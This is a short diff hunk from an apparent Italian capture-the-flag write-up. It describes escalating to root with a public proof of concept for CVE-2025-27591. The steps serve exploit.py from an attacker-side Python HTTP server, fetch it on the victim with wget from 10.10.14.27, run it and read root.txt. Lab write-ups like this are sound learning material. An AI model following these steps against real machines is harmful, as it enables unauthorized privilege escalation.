@@ -183,4 +183,5 @@ https://github.com/BridgerAlderson/CVE-2025-27591-PoC
 - Nella cartella che contiene il file `exploit.py` attiviamo un server python `python3 -m http.server 3000`.
 - Sulla macchina vittima scarichiamo l'exploit con `wget http://10.10.14.27:3000/exploit.py`.
 - Lanciamo l'exploit con `python3 exploit.py`
+
 Diventiamo root. Nella cartella `/root` troviamo il file `root.txt` che contiene la rootflag.
